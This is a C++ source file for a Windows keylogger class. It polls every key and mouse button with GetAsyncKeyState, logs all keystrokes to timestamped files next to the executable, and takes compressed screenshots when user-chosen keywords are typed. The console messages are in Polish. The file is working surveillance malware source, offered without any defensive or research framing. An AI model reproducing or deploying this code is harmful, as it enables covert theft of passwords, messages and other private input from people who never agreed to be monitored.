#include "stdafx.h"
#include "Keylogger.h"
#include "Application_History.h"
#include "Screenshot.h"

#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

#include <iostream>
#include <fstream>
#include <thread>
#include <string>
#include <sstream>
#include <algorithm>


Keylogger::Keylogger() { }

Keylogger::Keylogger(bool save_enabled)
{
	saving_enabled = save_enabled;
}

Keylogger::Keylogger(bool save_enabled, std::vector<std::string> &_keywords)
{
	saving_enabled = save_enabled;
	keywords = std::move(_keywords);
}

std::string Keylogger::intToString(int i)
{
	char buffer[4];
	_itoa_s(i, buffer, 4, 10);
	return std::string(buffer);
}

std::string Keylogger::getSelfPath()
{
	char selfpath[MAX_PATH];
	wchar_t selfpath_wchar[MAX_PATH];

	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
	size_t pReturnValue;
	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);

	return std::string(selfpath);
}

std::string Keylogger::dirBasename(std::string path)
{
	if (path.empty())
		return std::string("");

	if (path.find("\\") == std::string::npos)
		return path;

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	size_t pos = path.find_last_of("\\");
	if (pos != std::string::npos)
		path = path.substr(0, pos);

	if (path.substr(path.length() - 1) == "\\")
		path = path.substr(0, path.length() - 1);

	return path;
}

void Keylogger::save_to_file(std::ofstream &file_stream, const std::string &content)
{
	if (saving_enabled)
	{
		file_stream << content;
		file_stream.flush();
	}
}

void Keylogger::get_key(std::ofstream &file_logs)
{	
	for (unsigned char c = 1; c < 255; c++)
	{
		SHORT return_value = GetAsyncKeyState(c);
		if (return_value & 1)
		{ // on press button down
			std::string key = "";
			if (c == 1)
				key = "[LEFT MOUSE]"; // mouse left
			else if (c == 2)
				key = "[RIGHT MOUSE]"; // mouse right
			else if (c == 4)
				key = "[MIDDLE MOUSE]"; // mouse middle
			else if (c == 13)
				key = "[ENTER]";
			else if (c == 16 || c == 17 || c == 18)
				key = "";
			else if (c == 160 || c == 161) // lastc == 16
				key = "[SHIFT]";
			else if (c == 162) // lastc == 17
				key = "[LEFT CTRL]";
			else if (c == 163) // lastc == 17
				key = "[RIGHT CTRL]";
			else if (c == 164) // lastc == 18
				key = "[LEFT ALT]";
			else if (c == 165)
				key = "[RIGHT ALT]";
			else if (c == 8)
				key = "[BACKSPACE]";
			else if (c == 9)
				key = "[TAB]";
			else if (c == 20)
				key = "[CAPS LOCK]";
			else if (c == 27)
				key = "[ESC]";
			else if (c == ' ') // Space
			{
				key = c;
				all_keys.append(key);
				save_to_file(file_logs_clean_keys, key);
			}
			else if (c == 33)
				key = "[PAGE UP]";
			else if (c == 34)
				key = "[PAGE DOWN]";
			else if (c == 35)
				key = "[HOME]";
			else if (c == 36)
				key = "[POS1]";
			else if (c == 37)
				key = "[ARROW LEFT]";
			else if (c == 38)
				key = "[ARROW UP]";
			else if (c == 39)
				key = "[ARROW RIGHT]";
			else if (c == 40)
				key = "[ARROW DOWN]";
			else if (c == 45)
				key = "[INS]";
			else if (c == 46)
				key = "[DEL]";
			else if (c >= '0' && c <= '9') // Numbers
			{
				key = c;
				all_keys.append(key);
				save_to_file(file_logs_clean_keys, key);
			}
			else if (c >= 'A' && c <= 'Z') // Letters
			{
				key = c;

				if ((GetKeyState(VK_CAPITAL) & 0x001) == 0)
				{
					//Caps Lock is OFF
					std::transform(key.begin(), key.end(), key.begin(), ::tolower);
				}
				
				all_keys.append(key);
				save_to_file(file_logs_clean_keys, key);
			}

			else if (c == 91 || c == 92)
				key = "[WIN]";
			else if (c >= 96 && c <= 105)
				key = "[NUM " + intToString(c - 96) + "]";
			else if (c == 106)
				key = "[NUM /]";
			else if (c == 107)
				key = "[NUM +]";
			else if (c == 109)
				key = "[NUM -]";
			else if (c == 109)
				key = "[NUM ,]";
			else if (c >= 112 && c <= 123)
				key = "[F" + intToString(c - 111) + "]";
			else if (c == 144)
				key = "[NUM]";
			else if (c == 192)
				key = "[`]";
			else if (c == 222)
				key = "'";
			else if (c == 186)
				key = ";";
			else if (c == 186)
				key = "+";
			else if (c == 187)
				key = "=";
			else if (c == 188)
				key = ",";
			else if (c == 189)
				key = "-";
			else if (c == 190)
				key = ".";
			else if (c == 191)
				key = "/";
			else if (c == 219)
				key = "[";
			else if (c == 220)
				key = "\\";
			else if (c == 221)
				key = "]";
			else if (c == 226)
				key = "<";
			else
				key = intToString(c);

#ifdef DEBUG
			/*printf("Key = %s (%d)\n", key.c_str(), c);*/
			printf("%s (%d) ", key.c_str(), c);
#endif
			look_for_keyword(all_keys);

			save_to_file(file_logs, key);
		}
	}
}

void Keylogger::look_for_keyword(std::string &_all_keys)
{
	size_t position_of_key;

	// Search through all keywords to see if the user has typed something particular
	for (const std::string &key : keywords)
	{	
		//std::cout << "Content of all keys that were pressed: " << _all_keys << "\n";
		position_of_key = _all_keys.find(key);

		if (position_of_key != std::string::npos)
		{
			// Save a screenshot with the name of a keyword
			Screenshot screenshotter;
			screenshotter.take_screenshot("_KLUCZ=" + key);			
			screenshotter.compress_image();
						
			// Remove the key from string so that there are no double (and more) false positives.
			_all_keys.erase(position_of_key, key.size());
		}
	}
	
	// For performance reasons, if the current keys size is more than 100, we clear the buffer.
	if (_all_keys.size() > 100)
	{
		_all_keys.clear();
	}
}

std::string Keylogger::create_file()
{
	time_t rawtime;
	struct tm timeinfo;
	time(&rawtime);
	localtime_s(&timeinfo, &rawtime);

	std::string basepath = dirBasename(getSelfPath());
	char file_name[MAX_PATH];
	char file_path[MAX_PATH];
	strftime(file_name, 100, "%Y-%m-%d_%H-%M-%S", &timeinfo);
	sprintf_s(file_path, MAX_PATH, "%s\\%s%s", basepath.c_str(), file_name, FILEEXT);

	printf("Logi sa zapisywane do: '%s'\n", file_path);

	m_file_path = std::string(file_path);
	
	// Append keyword to a file name
	// TODO: This should be as a utility function as this is used in many places
	size_t position_to_prepend = m_file_path.find(".log");
	std::string path_for_clean_keys = m_file_path;
	path_for_clean_keys.insert(position_to_prepend, "_czyste_klawisze"); // No tabs, caps locks etc
	this->file_logs_clean_keys.open(path_for_clean_keys);

	return m_file_path;
}

std::ofstream& Keylogger::get_file_logs_clean_keys()
{
	return file_logs_clean_keys;
}

/* User can choose keywords - once they are typed the application will make the screenshot
 * at the time they are typed again. */
std::vector<std::string> get_keywords()
{
	std::string keyword;
	std::cout << "Prosze wpisac slowa KLUCZ (oddzielone spacja): ";
	std::getline(std::cin, keyword);

	std::stringstream strings_split(keyword);
	std::vector<std::string> keywords;

	while (strings_split >> keyword)
	{
		keywords.push_back(keyword);
	}

	return keywords;
}